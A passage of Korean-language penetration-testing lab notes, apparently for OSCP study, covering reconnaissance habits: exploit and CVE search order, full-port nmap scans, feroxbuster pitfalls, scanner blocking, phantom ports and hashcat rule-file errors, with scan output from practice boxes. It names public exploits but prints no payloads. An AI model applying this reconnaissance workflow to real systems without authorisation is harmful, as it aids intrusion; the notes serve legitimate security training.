**⑶ 필드명도 확장자도 고정이 아님.** 제품 식별 줄은 **첫 10줄 안**에 있으나 이름이 제각각임 — `49397.txt` 는 `# Vendor Homepage: https://cockpit-project.org/`, `49390.txt` 는 `# Product: Cockpit CMS (https://getcockpit.com)`. 확장자도 못 믿음:
```bash
searchsploit -p 49390
```
```text
  Exploit: Cockpit CMS 0.6.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49390
     Path: /usr/share/exploitdb/exploits/php/webapps/49390.txt
    Codes: N/A
 Verified: False
File Type: ASCII text
```
같은 검색 결과 안에서 `49397.txt` 는 **확장자가 `.txt` 인데 완전한 python3 스크립트**이고, `49390.txt` 는 산문임. `File Type` 을 보고 열 것(A-14).
— 출처: `~/PG/Cockpit/` 작업 중 실행(zsh 대화형 세션).

**⛔ 로그인 화면을 보면 자격증명부터 손이 가는데, 그 앞에 3초짜리 확인이 있음:**
```bash
searchsploit <제품명> | grep -i "pre-auth\|unauth"
```
**인증 없이 되는 것이 있으면 로그인 시도 자체가 불필요함.** [[pyLoader]] 가 그랬음 — `nmap` → 제품명 `pyLoad` → `searchsploit pyload` 가 `PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)` 한 건을 그대로 뱉었고, 익스플로잇에 **세션 쿠키가 단 하나도 안 들어감.** 실제로는 기본 자격증명으로 로그인한 뒤 정보 페이지를 읽는 데 **가장 긴 구간(~21분)**을 썼음(D 절).

⚠️ **그렇다고 로그인이 낭비였던 것은 아님.** 그 정보 페이지가 `/root/.pyload` 를 렌더해 **권한상승 단계가 없다는 확신을 미리** 줬고, 덕분에 셸을 잡은 뒤 열거에 시간을 쓰지 않았음. **정찰 비용은 회수되는 경우가 많음** — 문제는 「인증부터 뚫어야 한다」는 **잘못된 전제**이지 정찰 자체가 아님(B-1-40).

**⑷ 히트가 전부 낮은 버전이어도 「없음」이 아님 — CVE 번호로 다시 검색할 것.** [[Crane]](SuiteCRM 7.12.3) — `searchsploit suitecrm` 이 7.10.7 · 7.11.15 · 7.11.18 **세 갈래만** 뱉었고 전부 타겟보다 낮았음. 여기서 「7.12.3 용 공개 익스플로잇이 없음 → 웹은 막다른 길」로 결론내면 박스가 통째로 막힘. `SuiteCRM 7.12.3 CVE` 웹 검색 한 번에 CVE-2022-23940 + GitHub PoC 가 바로 나왔음 — **이 박스에서 시간을 가장 크게 태울 뻔한 분기점이 여기였음.** 2020년 이후 웹 앱 취약점은 상당수가 GitHub PoC 와 보안 어드바이저리로만 존재함.

**버전을 잡은 뒤의 검색 순서를 고정해 둘 것:**
1. `searchsploit <제품>` — 로컬 exploit-db. 가장 빠르지만 가장 안 나옴
2. `searchsploit -u` — DB 가 오래됐으면 결과가 비는 게 당연함
3. `<제품> <버전> CVE` 웹 검색 → NVD·어드바이저리에서 CVE 번호 확보
4. `CVE-XXXX-XXXXX github` → PoC 저장소
5. 제품 GitHub 의 릴리스 노트·커밋 diff — 「무엇을 고쳤는가」가 곧 「무엇이 취약한가」


**로컬 DB 에 없는 것은 검색어를 아무리 바꿔도 안 나온다 — 바꿀 것은 검색어가 아니라 «채널»이다.**
[[Flu]] — Confluence 7.13.6 을 찾으려고 `searchsploit atlassian 7` → `atlassian 7.` → `atlassian` → `atlassian 7.13.6` 로 **네 번** 검색어를 바꾼 기록이 `~/.zsh_history` 에 남아 있음. CVE-2022-26134 는 로컬 exploit-db 제목 색인에 애초에 없었음(exploit-db 에 없는 것이 아니라 이 DB 의 제목 색인에 안 잡힌 것).
```text
searchsploit atlassian 7
searchsploit atlassian 7.
searchsploit atlassian
searchsploit atlassian 7.13.6
```
— 출처: `~/.zsh_history`
→ **CVE 번호를 손에 쥐었으면 다음 수는 `github.com` 에서 그 번호로 검색하는 것임.** Flu 는 그렇게 `jbaines-r7/through_the_wire` 를 찾았고, 이것이 실제로 통한 유일한 PoC 였음. 소요는 1~2분.

#### A-1-12. 「top-1000 밖이라 못 봤다」 — 예열 스캔의 «범위»부터 확인한다

**놓친 포트를 포트의 희귀함으로 오귀인하지 말 것.** 확인할 것은 `nmap-services` 개방빈도 순위와 **내가 실제로 돌린 범위**임 — 둘은 다름.

[[LazySysAdmin]] — `6667/tcp`(InspIRCd)가 빠른 스캔(`--top-ports 200`, `quick.log`)에 안 잡혔고 `-p-` 가 뒤늦게 잡아줬음. 그러나 6667 은 `/usr/share/nmap/nmap-services` 개방빈도 **tcp 300위권**이라 nmap 기본 `--top-ports 1000` 안에 넉넉히 들어옴. 놓친 이유는 **내가 예열을 top-200 으로 좁혔기 때문**이지 포트가 희귀해서가 아님.

→ **예열 스캔의 범위를 기억해두지 않으면 이런 오귀인이 그대로 굳음.** `-p-` 를 생략하지 말 것(F-2).

**반대 방향의 좋은 사례 — 예열 결과로 방향을 정하지 말 것.** [[Monster]] 는 예열을 `--top-ports 200` 으로 돌렸으나 **`-p-` 결과가 나올 때까지 판단을 유보**했음. 결과적으로 추가된 포트(5040·7680·동적 RPC)가 전부 Windows 기본 구성이라 소득은 없었지만 **순서 자체는 지킬 것** — 소득 유무는 사후에만 알 수 있음.

⚠️ **반대로 「정말로 `nmap-services` 에 없는」 포트도 실재함** — 그때는 `--top-ports` 를 몇으로 키워도 안 나옴. 오귀인이 아니라 진짜인 경우의 실측은 A-1-15([[Flimsy]] 의 43500).

**반대 방향의 오귀인 — 「고번호니까 top-1000 밖이겠지」.** [[pyLoader]] 의 9666 은 `nmap-services` 에 `zoomcp`(빈도 `0.000304`)로 등재돼 있고 top-1000 커트라인 `0.000152` 의 **두 배**라 기본 스캔이 실제로 프로브함(`nmap -sT --top-ports 1000 --packet-trace 127.0.0.1 | grep -c ":9666"` → `2`). 그 노트 초고의 「`-p-` 없이 스캔하면 22번만 보인다」는 Kali 실측으로 반증됨. **포트 번호가 크다는 것과 희귀하다는 것은 다름** — 판정은 `grep -P "\t<포트>/tcp\t" /usr/share/nmap/nmap-services` 한 줄임.


**「top-1000 밖」을 눈대중으로 단정하지 말 것 — `nmap-services` 를 직접 셀 것.** [[Algernon]] 원 노트는 「9998 도 17001 도 top-1000 에 없다」고 적었으나 **9998 은 top-1000 «안»**임. Kali 7.98 실측:
```bash
awk '$2 ~ /\/tcp$/ {split($2,a,"/"); print $3, a[1]}' /usr/share/nmap/nmap-services \
  | sort -k1,1gr | head -1000 | awk '{print $2}' > /tmp/top1000.txt
grep -qx 9998 /tmp/top1000.txt && echo IN || echo OUT
```
`9998/tcp` 는 빈도 `0.000304` 로 등재돼 있고 1000번째 항목의 빈도는 `0.000152` 임 → **안**. `17001/tcp` 는 파일에 **아예 없어서** `-sS` 가 `unknown` 으로 찍은 것이고 이쪽만 밖임.
→ 정리하면 이 박스는 `-p-` 가 없어도 **정보원(9998)은 보이고 입구(17001)만 안 보임.** [[Hub]] 가 같은 형태로 틀렸던 자리이고([[_WRITEUP-STANDARD]] 의 「8082·9999는 기본 1000포트 밖」 반증 사례), **`-p-` 를 권하는 것은 옳아도 근거를 틀리면 다른 박스에서 top-1000 을 과소평가하게 됨.**
→ **서비스 «이름»도 `-sV` 결과만 신뢰할 것.** `-sS` 는 포트 번호로 `nmap-services` 표를 찍을 뿐이라 `9998 distinct32` 는 IANA 등록명이지 실제와 무관함.

#### A-1-13. 디렉터리 브루트 결과가 200 을 수천 건 뱉는다 — catch-all + 재귀 폭주

**원인** — 인증 뒤 관리 콘솔(Cockpit·Grafana·Portainer 류)은 존재하지 않는 경로도 같은 페이지를 **200 으로** 돌려주는 catch-all 라우팅을 씀. feroxbuster 는 그 200 을 「디렉터리」로 인정하고 **그 아래에 워드리스트 전체를 재귀로 다시 뿌림** — 재귀 한 겹마다 요청 수가 한 벌씩 불어남.

**판정 — 같은 바이트 수가 수백 번 반복되면 그 크기를 버릴 것.**
```bash
awk '/^200/{print $5}' ferox.txt | sort | uniq -c | sort -rn | head
```

[[Cockpit]] 실측(`~/PG/Cockpit/ferox.txt`, 2일차 06-25 13:36 회차, 594275바이트):
```bash
grep -c '^200' ferox.txt
```
```text
6833
```
```bash
grep '^200' ferox.txt | awk '{print $2,$3,$4,$5}' | sort | uniq -c | sort -rn | head -6
```
```text
    438 GET 700l 2899w 40222c
    350 GET 647l 2512w 30506c
    346 GET 647l 2573w 34670c
    340 GET 647l 2544w 33282c
    323 GET 647l 2532w 31894c
    317 GET 647l 2451w 27730c
```
```bash
grep '^200' ferox.txt | head -5
```
```text
200      GET      771l     3095w    43264c http://192.168.150.10:9090/download
200      GET      109l      623w    52583c http://192.168.150.10:9090/cockpit/static/fonts/RedHatDisplay-Medium.woff2
200      GET      771l     3095w    43264c http://192.168.150.10:9090/text/css
200      GET      771l     3095w    43264c http://192.168.150.10:9090/shell/index.html
200      GET      771l     3095w    43264c http://192.168.150.10:9090/@localhost
```
```bash
grep -oE 'https?://[^ ]+' ferox.txt | sed -E 's#(https?://[^/]+/)([^/]*)/.*#\1\2/#' | sort | uniq -c | sort -rn | head -4
```
```text
   2946 http://192.168.150.10:9090/text/
   2931 http://192.168.150.10:9090/shell/
      3 http://192.168.150.10:9090/cockpit/
      1 http://192.168.150.10:9090/zuma
```
200 응답 6,833건 중 **5,877건(86%)이 `/text/`·`/shell/` 두 디렉터리 밑**(각각 워드리스트 341행·1688행에서 파생). 11:12 에 Ctrl-C 로 끊은 회차 상태파일 — 요청 **66,771** / `wildcards_filtered: 22778` / `resources_discovered: 149`. 최종 회차 상태파일은 `expected_per_scan: 1323276`, `total_expected: 3970062`(재귀 세 벌 누적). **소요 2시간 반(06-25 11:12~13:36), 건진 것 0.**

**대응 플래그**(feroxbuster 2.13.1) — `-S <바이트>`/`-N <행수>`(크기 제외) · `--filter-similar-to <URL>` · `-C 404,200`(상태코드 제외) · **`--no-recursion`/`-d 1`(재귀 차단 — catch-all 대응 최우선)**.
⚠️ 링크 추출은 **기본 켜짐**이고 끄는 플래그는 `--dont-extract-links` 임 — `--help` 에 «켜는» 쪽 플래그는 아예 없음. 워드리스트에 없는 `@localhost` 가 결과에 뜬 것이 그 증거.

→ **더 근본적으로 — 인증 뒤 관리 콘솔은 자산 트리가 패키지에 고정돼 숨은 경로가 없음.** 브루트포스 대상이 아니라 **자격증명을 구해 로그인할 대상**임.

#### A-1-14. 브루트 결과가 갑자기 빈약해졌다 — 「사이트가 원래 그렇다」가 아니라 「차단당했다」

**증상** — 직전까지 잘 나오던 스캔이 다음 대상에서 링크추출분(정적 자산)만 남고 워드리스트 히트가 0에 가까움.

**확인법은 쌈** — 이미 200 이 나왔던 경로 하나를 `curl -i` 로 재요청. 여전히 200 이면 원래 그런 것, 403 이나 낯선 페이지면 차단.

**힌트는 결과 목록 «안»에 있을 수 있음** — 차단 페이지 이름(`blocked.html` 등)이 그대로 열거돼 있는데 발견하고도 열어보지 않으면 신호를 놓침.

[[Cockpit]] 1일차 tcp/80 스캔(06-25 13:36~15:32, 두 시간) 전체 결과:
```text
200      GET       78l      321w     3349c http://192.168.150.10/index.html
MSG      0.000 feroxbuster::heuristics detected directory listing: http://192.168.150.10/img (Apache)
200      GET      707l     4190w   598838c http://192.168.150.10/img/blaze.png
200      GET       78l      321w     3349c http://192.168.150.10/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://192.168.150.10/js (Apache)
200      GET       29l       85w      913c http://192.168.150.10/js/index.js
200      GET       29l       60w      477c http://192.168.150.10/css/type.css
200      GET      10l       28w      233c http://192.168.150.10/blocked.html
```
— 출처: `~/PG/Cockpit/ferox_80.txt`(1일차, `directory-list-2.3-medium.txt`). 건진 6건이 전부 `index.html` 링크로 도달 가능한 정적 자산이고, `login` 은 이 워드리스트 **53행째**라 늦게 나올 이유가 없는데 1일차엔 보고되지 않음(2일차엔 `login.php` 가 나옴).

정황: 9090 에 2시간 반 동안 수만 건을 때린 직후 같은 호스트의 80 을 200스레드로 두들겼고, 웹루트에 `blocked.html` 이 존재하며, 결과는 링크 추출분만 남음 → **스캐너 IP 차단 가능성이 큼** `[가정]`. 다음 날 박스가 재배포돼 상태가 초기화된 뒤 같은 성격의 스캔이 곧바로 `login.php` 를 찾은 것도 이 가정과 부합함. ⚠️ 다만 **`blocked.html` 의 내용을 확인한 기록은 없고 타겟도 이미 소멸해 확정 불가** — 「관측 없음」임.

#### A-1-15. 웹이 상위 1000 포트 «밖»에만 있다

**증상** — top-1000 스캔에 SSH 하나만 뜸. 「웹이 없는 박스」로 판단하면 시작조차 못 함.

[[Hawat]] — 열린 포트가 `22 · 17445 · 30455 · 50080` 이고 **80 이 아예 없음.** 웹 3개가 전부 고번호 포트임. `-p-` 를 생략했으면 이 박스는 진입점이 0개였음.
```text
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)
17445/tcp open   http         Apache Tomcat (language: en)
30455/tcp open   http         nginx 1.18.0
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
```
— 출처: `~/PG/Hawat/nmap.log`

**비용은 1분 미만임** — `-p- --min-rate 3000` 전수 스캔이 **44초**에 끝났음(`allports.nmap`, 09:15:39~09:16:23). 급하면 2단계로 나눌 것: `-p-` 로 포트만 먼저 뽑고 열린 포트에만 `-sCV` 를 다시 걸 것.
⚠️ [[Hawat]] 은 두 스캔을 **겹쳐** 돌렸음 — `nmap.log`(`-sCV -p- -A`, 09:15:12~09:16:03)와 `allports.nmap`(`-p-` 만, 09:15:39~09:16:23)이 51초·44초로 거의 동시에 돌아 사실상 중복임(A-18 과 같은 부류).

**`--top-ports` 는 「먼저 볼 것」을 정하는 용도지 「없다」를 판정하는 용도가 아님.** [[Flimsy]] — 예열 top-1000 이 22·80·3306 만 줬고 `-p-` 가 43500(APISIX 2.8)을 줬는데 **그 한 줄이 박스 전체**였음. `-p-` 를 기다리지 않고 80 gobuster·MySQL 브루트포스로 갔으면 몇 시간을 태웠음 — 80 은 완전한 미끼(정적 templatemo 템플릿, 동적 엔드포인트 0개)였고 MySQL 은 grant 가 localhost 한정이라 **인증 단계에 도달조차 못 함.**

**포트가 `nmap-services` 에 등재돼 있지 않으면 `--top-ports` 를 몇으로 키워도 안 나옴.** Kali 에서 확인(이 박스 산출물 아님):
```bash
grep -P '\t43500/tcp' /usr/share/nmap/nmap-services
grep '/tcp' /usr/share/nmap/nmap-services | sort -k3 -rn | grep -n '9443/tcp'
```
첫 명령 **출력 없음** = 43500 미등재. 둘째는 9443 이 빈도순 **1096위** = top-1000 바로 바깥:
```text
1096:tungsten-https	9443/tcp	0.000152	# WSO2 Tungsten HTTPS
```
→ **난이도 Fundamental 이어도 전 포트 스캔 없이는 시작조차 못 하는 박스가 실재함.** 쉬운 박스일수록 정찰을 줄이고 싶어지는데 그 유혹이 정확히 여기서 비용이 됨. **`-p-` 결과 전에는 판단을 시작하지 말 것.**
⚠️ 놓친 포트를 「희귀해서」로 오귀인하는 반대 사고는 A-1-12 — **먼저 내가 돌린 범위를 확인하고, 그다음에 등재 여부를 볼 것.**

**같은 골격의 다른 사례 — [[Butch]] 의 웹은 450/tcp 하나뿐이었음.** 기본 1000포트 스캔이면 21·25·135·139·445 만 보이고, 그러면 자연스럽게 SMB null session → SMTP `VRFY` → FTP 익명으로 새게 됨. **셋 다 그 박스의 정답이 아니었고 기록에도 결과가 없음.** 손절선은 D 절에 표로 있음.
→ **「웹앱이 안 보인다」의 첫 대응은 재스캔이 아니라 «전 포트 스캔 결과를 다시 읽는 것»임.**

#### A-1-16. Arch Linux 는 경로 관례가 다르다

**`/var/www/html` 이 아니라 `/srv/http`(nginx 기본).** [[Hawat]] 은 이 판정이 웹셸 투하 경로를 통째로 결정했음 — 데비안 관례로 찾았으면 못 찾음.

**OS 판정 근거를 둘 확보할 것**([[Hawat]] 실측):
1. `phpinfo.php` 의 `System` 필드 — `Linux hawat 5.10.14-arch1-1 #1 SMP PREEMPT Sun, 07 Feb 2021 x86_64`
2. nmap OS 추정 — `Aggressive OS guesses: Linux 5.0 - 5.14 (98%)` (커널 5.10 과 모순 없음)

**`phpinfo.php` 가 노출돼 있으면 한 번에 얻는 것** — `System`(OS·커널) · `DOCUMENT_ROOT` · `SCRIPT_FILENAME` · `disable_functions` · `open_basedir` · `Server API`(FPM 인지 mod_php 인지).
→ **PHP 박스를 만나면 `phpinfo.php`·`info.php`·`test.php` 를 먼저 찔러볼 것.** [[Hawat]] 은 gobuster 가 `/phpinfo.php`(200, 68610B)를 잡아 줬음(`~/PG/Hawat/gob_30455.txt`).

#### A-1-17. nmap 이 `filtered` 라고 적은 포트를 버렸다

**`filtered` 는 「안 열림」이 아님 — 같은 스캔의 나머지 포트가 뭐라고 적혀 있는지 함께 읽을 것.**

[[Outdated]] — top-1000 과 `-p-` 두 스캔 모두 동일:
```text
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE          VERSION
22/tcp    open     ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http             Apache httpd 2.4.41 ((Ubuntu))
10000/tcp filtered snet-sensor-mgmt
```
— 출처: `~/PG/Outdated/nmap.log` · `quick.log`

닫힌 포트 65532개는 **RST 로 답하는데** 10000 만 무응답임 → **응답을 삼키는 무언가가 경로에 있다**는 뜻이지 서비스가 없다는 뜻이 아님. 침투 후 `ss -lntp` 로 확인하니 바인딩이 **`0.0.0.0:10000`** 이었음 — 로컬 전용이라 안 보였던 것이 아니라 **경로상 방화벽**이 원인.

- **정찰 단계에서 할 일** — filtered 포트의 기본 서비스를 메모해 둘 것(10000 = Webmin, 3306 = MySQL 등). 침투 후 제일 먼저 확인할 목록이 됨
- **셸을 잡으면** `ss -lntp` 로 대조하고 SSH `-L` 로 끌어올 것(B-71)
- ⚠️ 반대 방향 오독 주의 — filtered 가 **항상** 무언가 있다는 뜻도 아님. 「열려 있다는 근거가 없음」과 「닫힘이 확인됨」의 구분은 A-19 와 같은 선임

**반대 방향 — `closed`(RST)도 「방화벽 없음」의 증거가 아님.** `Not shown: 65531 closed tcp ports (reset)` 에서 **확정되는 것은 둘뿐임:** ① 묵살형 인라인 차단이 없음 ② 숨은 고번호 포트가 없음.
`iptables -j REJECT --reject-with tcp-reset`·방화벽 장비의 reject 정책·클라우드 보안그룹이 **전부 RST 를 돌려줌.** RST 와 `filtered` 의 차이는 **차단 «방식»이지 차단 «유무»가 아님.**

⛔ **그리고 어느 쪽이든 «아웃바운드»의 근거가 되지 못함.** 인바운드 필터와 egress 정책은 서로 다른 규칙셋이고 대개 다른 지점에서 집행됨 — 인바운드 전면 허용 + 아웃바운드 화이트리스트는 오히려 권장 구성임. closed/RST 는 **내가 보낸 SYN 에 타겟이 어떻게 답했는가**만 말함. [[RubyDome]] 은 결과적으로 4444 가 붙었으나 그것은 **붙은 뒤에 알게 된 사실**이고, 스캔 결과에서 예견했던 것처럼 적으면 안 됨(A-31).

**출처** — [[Crane]] · [[RubyDome]]. 대조는 [[Hawat]](웹이 50080 에 숨어 `-p-` 가 필수였던 경우, A-1-15).

#### A-1-18. `--min-rate` 를 높이면 «유령 포트»가 생긴다

**증상** — 고속 스캔이 실제 서비스보다 많은 포트를 「열림」으로 보고하고, OS 판정까지 같이 흔들림.

[[Muddy]] 실측 — `--min-rate 5000` 스캔이 실제 서비스 5개(22·25·80·111·8888) 외에 **443·808·908** 을 열림으로 보고했고 OS 를 `MikroTik RouterOS 7.X`(신뢰 낮은 배지)로 오판했음. 세 포트 모두 `curl` 에 빈 응답:
```bash
curl http://192.168.248.161:443/     → 빈 응답
curl http://192.168.248.161:808/     → 빈 응답
curl http://192.168.248.161:908/     → 빈 응답
```
같은 시각대 병행 재확인(`nmap -Pn -sS -p- --min-rate 3000 -T4`, `-A` 없음)에서는 셋이 사라짐 — **두 스캔이 겹치는 포트만 실제 서비스로 확정**함:
```text
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
111/tcp  open  rpcbind
8888/tcp open  sun-answerbook
```
— 출처: `~/PG/Muddy/nmap_full.txt`

**판별 기준 — 5초면 갈림:**

| 관측 | 뜻 |
|---|---|
| RST 가 옴 | 닫힘. 스캔이 틀린 것 |
| 아무것도 안 옴(타임아웃) | 필터링·방화벽 |
| 연결은 되는데 데이터가 없음 | 진짜 서비스인데 **클라이언트가 먼저 말해야 하는 프로토콜**(배너 없는 서비스) |

`nc -vz <IP> <port>` 또는 `nmap -sT -p <port> --reason` 으로 판정할 것. **`--reason` 이 nmap 의 판정 근거(`syn-ack`/`reset`/`no-response`)를 그대로 찍어 주므로 오탐 추적에 가장 유용함.** 자동 판정을 부재·존재의 근거로 쓰지 말라는 A-11 의 포트 판임.


**교차검증이 «일치»했을 때의 판정도 함께 적을 것.** [[Algernon]] — `--min-rate 5000`(208초) 과 `--max-rate 500 -T3`(165초) 두 스캔이 **14개 포트 전부 일치**해 그 시점부터 포트 목록을 확정 사실로 취급했음. [[Muddy]] 처럼 어긋나면 겹치는 것만 확정하고, 이 박스처럼 일치하면 더 재보지 않는 것이 옳음 — **두 번 돌리는 비용이 3분이라 판정 비용이 시도 비용보다 싼 전형적인 자리임.**
⚠️ 원 노트는 「`--min-rate` 는 없는 포트를 만들어내지는 않지만 있는 포트를 놓칠 수 있다」고 단정했는데 **[[Muddy]] 실측이 그 절반을 반증함**(443·808·908 유령 포트). 오차는 **양방향**임.

#### A-1-19. 생성한 사전·목록이 0줄인데 «조용하다» — 파이프라인이 실패를 삼킨다

**증상** — 앞 명령이 실패했는데 뒷 명령이 정상 완료해 0바이트 파일이 「성공적으로」 만들어짐. 다음 단계는 빈 사전을 물고 아무것도 못 찾는데 에러가 없음.

[[Monster]] 실측 — `best64.rule` 은 Kali hashcat 7.1.2 에 **없음**(`best66.rule` 만 있음). 튜토리얼과 치트시트가 거의 전부 `best64.rule` 을 쓰니 이름을 의심할 이유가 없음.
```bash
ls /usr/share/hashcat/rules/ | grep -i best
```
```text
best66.rule
```
**도구가 조용한 것이 아니라 파이프라인이 목소리를 버린 것임.** 직접 때리면 종료 코드 **255** 와 에러 문구가 다 나옴:
```text
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule w1.txt > o.txt 2> e.txt
exit=255
stdout lines: 0
stderr: [/usr/share/hashcat/rules/best64.rule: No such file or directory]
```
그런데 실제로 쓴 형태는 이랬음:
```bash
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule words.txt | sort -u > words_b64.txt
```
여기서 **세 겹으로 소리가 죽음** — ①에러가 **stderr** 로 나가 `> words_b64.txt` 리다이렉트를 안 탐 ②파이프라인 종료 코드는 **마지막 명령 `sort` 의 0** 이라 `&&` 체인도 `set -e` 도 안 걸림 ③`sort` 가 빈 입력을 정상 처리해 **0바이트 파일이 성공적으로 만들어짐.** 원격 tmux 안에서 돌리면 stderr 마저 다른 페인으로 흩어짐. `~/PG/Monster/words_b64.txt` 가 지금도 0바이트로 남아 있음.

→ **반사 둘** — ⓐ 룰·워드리스트 파일명은 배포판마다 다르니 쓰기 전에 `ls /usr/share/hashcat/rules/` 를 한 번 볼 것 ⓑ **사전을 만들었으면 다음 명령에 넘기기 전에 `wc -l` 을 칠 것.** 0줄이면 룰 파일명부터 의심. 파이프 끝의 파일 크기를 직접 보는 것 말고 안전한 방법이 없음(A-1-10 과 같은 뿌리).
[[Monster]] 는 `best66.rule` 로 바꿔 14,579개 후보를 만들었고 거기서 정답 `wazowski` 가 나왔음(B-6-10).

#### A-1-20. PHP 사이트인데 브루트 확장자에 `php` 를 안 넣었다

**증상** — 대형 사전을 오래 돌렸는데 직접 링크되지 않는 PHP 파일이 목록에 안 잡힘.

[[Zipper]] — `feroxbuster -x html,txt` 로 62만 단어 사전을 **19분** 돌렸으나 `upload.php` 미탐지. 결국 LFI 로 소스를 유출하고서야 그 파일의 존재를 알았음.

→ **PHP 사이트 열거는 `-x php,txt,bak,old,zip` 을 기본값으로 할 것.** 손실 비용(스캔 한 번 더 도는 시간)이 놓치는 비용보다 **항상** 쌈. 워드리스트를 키우는 것보다 확장자를 맞추는 쪽이 먼저임(A-23).

**IIS/ASP.NET 판 — `-x` 에 `txt` 를 안 넣으면 소스 노출을 통째로 놓침.** `.cs`·`.master` 는 IIS 가 거부하지만 개발자가 만든 `.txt`·`.bak` 사본은 정적 파일로 원문이 그대로 나옴. [[Butch]] 의 전체 체인이 `site.master.txt` 를 읽는 데서 출발했고, `-x asp,aspx` 만 줬으면 **SQLi 를 찾아도 무기화하지 못했음.**
```text
-x aspx,asp,ashx,asmx,config,txt,bak,old,zip,rar,7z,log
```
`config` 가 들어 있는 이유는 `web.config` 에 DB 연결 문자열(평문 자격증명)이 흔하기 때문임. 확장자를 뒤에 «덧붙이는» 조합은 B-1-42.

**아카이브 확장자를 빠뜨리면 「디렉터리는 찾았는데 정답 파일은 못 본다」가 됨 — 그리고 그때 살려주는 것은 스캐너의 «마지막 요약 줄»임.** [[Sorcerer]] — `-x html,txt` 로 돌려 `zipfiles/`(301)만 걸렸고, 그 안의 `francis.zip`·`max.zip` 은 **디렉터리 리스팅이 켜져 있어서** 보였을 뿐임(파일 이름이 사람 이름 사전에 우연히 있어 재귀 매칭에도 걸림). feroxbuster 는 `--scan-dir-listings` 없이는 리스팅을 재귀로 훑지 않고, 대신 그 사실을 스스로 알려줌:
```text
http://TARGET:PORT/zipfiles/ => Directory listing (add --scan-dir-listings to scan)
```
→ **이 줄을 보면 무조건 브라우저·`curl` 로 직접 열 것.** 파일 이름이 흔치 않았으면 디렉터리 존재만 알고 내용물은 통째로 놓쳤을 자리임. 스캐너의 경고·요약 줄을 읽는 습관 자체가 별도로 값어치가 있음(A-15 의 `Auto-filtering` 줄과 같은 계열).
→ **홈 디렉터리 백업(`.zip`)이 잡히면 SSH 키·`.bash_history`·`.netrc`·앱 설정 `.bak` 이 한 번에 딸려옴.** [[Sorcerer]] 는 `id_rsa` + `authorized_keys` + `tomcat-users.xml.bak` 셋을 동시에 얻었음 — `unzip -l` 로 **`.` 로 시작하는 숨은 파일까지 포함해** 목록부터 볼 것.
→ 순서도 함께 — **열거 → 소스·주석·`robots.txt` → 그다음이 자격증명임.** 로그인 폼을 먼저 보면 찔러보고 싶어지지만 커스텀 폼은 「기본 자격증명」 개념 자체가 없는 경우가 많음(A-25).

#### A-1-21. 웹 루트에 미참조 이미지가 있다 — 스테가노 전에 «기성 템플릿»부터 확인한다

**증상** — `/images/` 에 `index.html` 이 참조하지 않는 이미지가 섞여 있음. 「참조 안 되는 파일 = 숨긴 것」 반사로 전부 받아 파게 됨.

[[Fowsniff]] — `banner.jpg`·`img1.jpg` 를 받아 팠고 **5분 소모.** 나온 것은 Photoshop 이 남긴 XMP 메타데이터뿐이었음.
```text
banner.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 1920x573, components 3
img1.jpg:   JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 1200x297, components 3
pic01.jpg:  JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=4, xresolution=62, yresolution=70, resolutionunit=2], progressive, precision 8, 1200x297, components 3
```
— 출처: `~/PG/Fowsniff/web/` 보존 파일로 재확인(2026-08-26)

**판정 근거 둘** — ① `img1.jpg` 와 참조되는 `pic01.jpg` 의 해상도가 **1200x297 로 동일** ② 세 파일의 XMP `OriginalDocumentID` 가 **같은 uuid**(`uuid:152A5A7AC399E2118D48F504E8CD0A42`). 같은 원본을 다르게 저장한 자매 파일이지 은닉물이 아님.

⚠️ **`grep` 한 번으로 「없다」고 판정하지 말 것.** `pic01.jpg` 는 같은 uuid 를 **속성이 아니라 XML 엘리먼트 형태**(`<xmpMM:OriginalDocumentID>…</xmpMM:OriginalDocumentID>`)로 갖고 있어 속성 패턴만 긁는 grep 에는 「없음」으로 나옴(A-11).

→ **가설을 세우기 전에 그 사이트가 기성 템플릿인지 확인할 것.** `README.txt`/`LICENSE.txt` 가 대놓고 적어둠 — [[Fowsniff]] 는 `Escape Velocity by HTML5 UP`, 데모 이미지는 사진작가 Felicia Simion 것이라고 명시돼 있었음. **미참조 자산은 정적 템플릿 사이트에서는 오히려 정상임.**
⚠️ 반대 방향 — 템플릿이어도 **「손댄 문단」은 자격증명 힌트**임(B-1-17). 버릴 것은 자산이지 본문이 아님.

#### A-1-22. 박스 안에 자격증명 소스가 없다 — 박스가 «지목한 밖»을 읽는다

**증상** — 웹에 동적 페이지가 하나도 없음(폼 없음, 확장자 없음, 파라미터 없음). 열거를 아무리 돌려도 진입점이 안 나옴.

[[Fowsniff]] — 웹 본문 자체가 답을 줌: 「데이터 유출로 직원 계정·비밀번호가 노출됐고 공격자가 공식 `@fowsniffcorp` 트위터 계정을 탈취했다」. **자격증명은 박스 안이 아니라 밖에 있었음.** 원본 paste(`pastebin.com/raw/NrAqVeeX`)는 404 로 삭제돼 공개 미러에서 해시 9쌍을 복원함.

⚠️ **OSCP 시험 박스는 자기 완결적이라 이 단계 자체는 전이되지 않음.** 정찰로 얻을 수 없는 값을 인터넷에서 가져와야 하는 구성은 시험에 나오지 않음. 전이되는 것은 **「박스 안을 더 파는 게 아니라 박스가 지목한 힌트를 다시 읽는다」는 판단** 하나임 — [[Fowsniff]] 는 그 판단이 늦어 이미지 스테가노에 5분을 씀(A-1-21).

→ **웹이 정적이라고 판정되면 15분 안에 접고**(D 절) 본문이 지목한 대상(사람 이름·제품명·SNS 계정·사건)으로 방향을 틀 것.

#### A-1-23. 확장자 사전을 늘려도 새 경로가 안 나온다 — 라우팅형 앱은 파일이 아님

